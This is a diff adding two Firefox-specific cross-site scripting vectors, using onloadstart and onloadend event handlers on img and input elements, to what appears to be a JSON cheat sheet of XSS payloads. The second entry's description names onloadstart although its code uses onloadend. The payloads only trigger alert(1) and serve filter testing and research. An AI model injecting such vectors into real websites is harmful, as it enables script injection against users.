@@ -159,5 +159,20 @@
             "edge"
         ],
         "url": "http://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cuse%20href%3D%22%2F%2Fsubdomain1.portswigger-labs.net%2Fuse_element%2Fupload.php%23x%22%20%2F%3E%3C%2Fsvg%3E&context=html"
+    },
+    {
+        "description": "onloadstart event for media elements in Firefox v107 and below",
+         "code": "<img src=validimage.png onloadstart=alert(1)>",
+                "browsers": [
+                    "firefox"
+                ]
+
+    },
+    {
+        "description": "onloadstart event for media elements in Firefox v107 and below",
+        "code": "<input type=image onloadend=alert(1) src=validimage.png>",
+                "browsers": [
+                    "firefox"
+                ]
     }
 ]
